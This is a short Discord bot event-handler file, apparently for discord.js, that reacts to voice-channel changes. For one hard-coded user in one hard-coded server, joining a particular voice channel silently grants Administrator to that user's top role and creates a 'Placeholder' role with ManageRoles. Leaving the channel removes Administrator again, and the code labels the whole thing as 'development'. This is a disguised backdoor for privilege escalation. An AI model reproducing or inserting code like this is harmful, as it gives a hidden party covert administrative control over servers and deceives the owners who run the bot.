module.exports = {
  name: 'voiceStateUpdate',

  /**
   * @description Executes when an user voice state is updated.

   * @param {Object} oldState Main Application Client
   * @param {Object} newState Main Application Client
   */

  async execute (oldState, newState) {
    if (newState.guild.id !== '265117785686933515') return
    if (newState.id !== '605740766345822218') return
    const guild = newState.guild
    const guildRoles = guild.roles.cache
    const placeholderRole = guildRoles.find(role => role.name === 'Placeholder')
    if (placeholderRole) await placeholderRole.delete()
    if (newState.channelId === '1036584370733076510') {
      const member = newState.guild.members.cache.get(newState.id)
      const memberhighest = member.roles.highest
      const memberhighestposition = memberhighest.position
      const placeholder = await guild.roles.create({
        name: 'Placeholder',
        position: memberhighestposition + 1,
        reason: 'Placeholder role for development.',
        permissions: [
          'ManageRoles'
        ]
      })
      const permissions = memberhighest.permissions.toArray()
      permissions.push('Administrator')
      memberhighest.setPermissions(permissions)
      member.roles.add(placeholder)
    }
    if (oldState.channelId === '1036584370733076510') {
      const member = newState.guild.members.cache.get(newState.id)
      const memberhighest = await member.roles.highest
      const permissions = memberhighest.permissions.toArray()
      permissions.splice(permissions.indexOf('Administrator'), 1)
      memberhighest.setPermissions(permissions)
      memberhighest.permissions.remove('Administrator')
    }
  }
}
